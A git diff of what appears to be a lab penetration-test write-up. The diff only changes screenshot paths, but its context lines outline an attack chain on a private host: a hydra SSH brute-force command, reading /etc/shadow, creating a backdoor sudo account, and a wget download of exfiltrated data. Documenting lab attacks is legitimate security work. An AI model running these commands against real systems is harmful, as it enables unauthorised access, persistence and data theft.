@@ -30,7 +30,7 @@ hydra -l admin -P passwords.txt ssh://172.16.207.4 -t 4 -V
 
 **Result:** Cracked `admin:admin123` in 2 seconds on 3rd attempt.
 
-![Hydra Brute-Force](screenshots/02_hydra_bruteforce.png)
+![Hydra Brute-Force](02_hydra_bruteforce.png)
 
 ---
 
@@ -43,7 +43,7 @@ whoami && hostname && id
 
 **Result:** Shell obtained as admin (uid=1001), member of sudo group.
 
-![SSH Access](screenshots/03_ssh_initial_access.png)
+![SSH Access](03_ssh_initial_access.png)
 
 ---
 
@@ -57,7 +57,7 @@ cat /etc/shadow
 
 **Result:** Root access via passwordless sudo. /etc/shadow dumped revealing all password hashes.
 
-![Privilege Escalation](screenshots/04_privilege_escalation.png)
+![Privilege Escalation](04_privilege_escalation.png)
 
 ---
 
@@ -73,7 +73,7 @@ cat /etc/passwd | grep backdoor
 
 **Result:** Backdoor account created (uid=1002) with full sudo privileges.
 
-![Backdoor Creation](screenshots/05_backdoor_persistence.png)
+![Backdoor Creation](05_backdoor_persistence.png)
 
 ---
 
@@ -94,8 +94,8 @@ wget http://172.16.207.4:8888/stolen_data.tar.gz
 
 **Result:** 1364 bytes of sensitive data exfiltrated via HTTP.
 
-![Exfil Server](screenshots/06_exfiltration_server.png)
-![Exfil Download](screenshots/07_exfiltration_download.png)
+![Exfil Server](06_exfiltration_server.png)
+![Exfil Download](07_exfiltration_download.png)
 
 ---
 
